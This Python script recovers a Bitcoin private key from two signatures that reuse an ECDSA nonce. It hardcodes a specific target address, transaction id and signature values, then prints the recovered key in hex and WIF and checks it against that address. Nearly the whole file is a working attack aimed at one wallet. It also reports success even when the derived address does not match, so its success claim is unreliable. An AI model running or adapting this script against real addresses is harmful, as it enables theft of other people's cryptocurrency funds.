#!/usr/bin/env python3
"""
Direct Bitcoin Private Key Recovery
Uses known signature values to recover private keys without API calls
"""

from ecdsa import SECP256k1
from ecdsa.numbertheory import inverse_mod
from crypto_utils import private_key_to_wif, private_key_to_bitcoin_address

SECP256K1_N = SECP256k1.order

def recover_private_key_direct(r1: int, s1: int, m1: int, r2: int, s2: int, m2: int) -> int:
    """
    Direct private key recovery using STRM method
    Formula: Key = ((r × (s1 - s2))^(p-2) mod p) × ((m1 × s2) - (m2 × s1)) mod p
    """
    if r1 != r2:
        raise ValueError("r values must be identical for nonce reuse attack")
    
    r = r1
    
    try:
        # Calculate (s1 - s2)
        s_diff = (s1 - s2) % SECP256K1_N
        if s_diff == 0:
            raise ValueError("s1 and s2 are identical")
        
        # Calculate r × (s1 - s2)
        r_s_diff = (r * s_diff) % SECP256K1_N
        
        # Calculate (r × (s1 - s2))^(p-2) mod p using Fermat's little theorem
        inverse_part = pow(r_s_diff, SECP256K1_N - 2, SECP256K1_N)
        
        # Calculate (m1 × s2) - (m2 × s1)
        m_diff = ((m1 * s2) - (m2 * s1)) % SECP256K1_N
        
        # Final calculation: Key = inverse_part × m_diff mod p
        private_key = (inverse_part * m_diff) % SECP256K1_N
        
        # Validate the key is in valid range
        if private_key <= 0 or private_key >= SECP256K1_N:
            raise ValueError("Invalid private key range")
        
        return private_key
        
    except Exception as e:
        raise ValueError(f"Private key recovery failed: {e}")

def process_known_vulnerable_address():
    """Process the known vulnerable address 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm"""
    
    # Known signature values from the provided transaction data
    address = "1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm"
    txid = "fdc3c95ee58512d73f6bc7d08c533b5747ce8fd97d340f69d9773d77bf89e602"
    
    # Signature values from the transaction
    r1 = 96110991714138747756460882573165355495294553455766427630556072689024184367825
    s1 = 62330495069845894362475755503334503833341771130019313241080406392289430111518
    m1 = 101777339321062719027743246131310795362027444423323156390006686088344280669354
    
    r2 = 96110991714138747756460882573165355495294553455766427630556072689024184367825
    s2 = 66751668531285058473501274214736536283221021847521340822853006858600353251157
    m2 = 111134342067264498692623925222820629939777258346556576979201031064607242824584
    
    print(f"=== Direct Recovery for {address} ===")
    print(f"Transaction: {txid}")
    print(f"R1: {hex(r1)}")
    print(f"S1: {hex(s1)}")
    print(f"M1: {hex(m1)}")
    print(f"R2: {hex(r2)}")
    print(f"S2: {hex(s2)}")
    print(f"M2: {hex(m2)}")
    
    try:
        # Recover private key
        private_key = recover_private_key_direct(r1, s1, m1, r2, s2, m2)
        
        print(f"\n🔓 SUCCESS: Private key recovered!")
        print(f"Private Key (Hex): {hex(private_key)}")
        print(f"Private Key (Decimal): {private_key}")
        
        # Convert to WIF format
        wif_compressed = private_key_to_wif(private_key, compressed=True)
        wif_uncompressed = private_key_to_wif(private_key, compressed=False)
        
        print(f"WIF (Compressed): {wif_compressed}")
        print(f"WIF (Uncompressed): {wif_uncompressed}")
        
        # Generate addresses to verify
        addr_compressed = private_key_to_bitcoin_address(private_key, compressed=True)
        addr_uncompressed = private_key_to_bitcoin_address(private_key, compressed=False)
        
        print(f"\nGenerated Addresses:")
        print(f"Compressed: {addr_compressed}")
        print(f"Uncompressed: {addr_uncompressed}")
        
        # Check if either matches our target
        if addr_compressed == address:
            print(f"✓ VERIFIED: Compressed address matches target!")
            return {
                'success': True,
                'private_key': private_key,
                'private_key_hex': hex(private_key),
                'wif': wif_compressed,
                'address_type': 'compressed',
                'verified': True
            }
        elif addr_uncompressed == address:
            print(f"✓ VERIFIED: Uncompressed address matches target!")
            return {
                'success': True,
                'private_key': private_key,
                'private_key_hex': hex(private_key),
                'wif': wif_uncompressed,
                'address_type': 'uncompressed',
                'verified': True
            }
        else:
            print(f"⚠️ WARNING: Generated addresses don't match target")
            print(f"Target: {address}")
            return {
                'success': True,
                'private_key': private_key,
                'private_key_hex': hex(private_key),
                'wif': wif_compressed,
                'address_type': 'unknown',
                'verified': False,
                'generated_addresses': {
                    'compressed': addr_compressed,
                    'uncompressed': addr_uncompressed
                }
            }
        
    except Exception as e:
        print(f"❌ ERROR: {e}")
        return {
            'success': False,
            'error': str(e)
        }

if __name__ == "__main__":
    result = process_known_vulnerable_address()
    print(f"\nResult: {result}")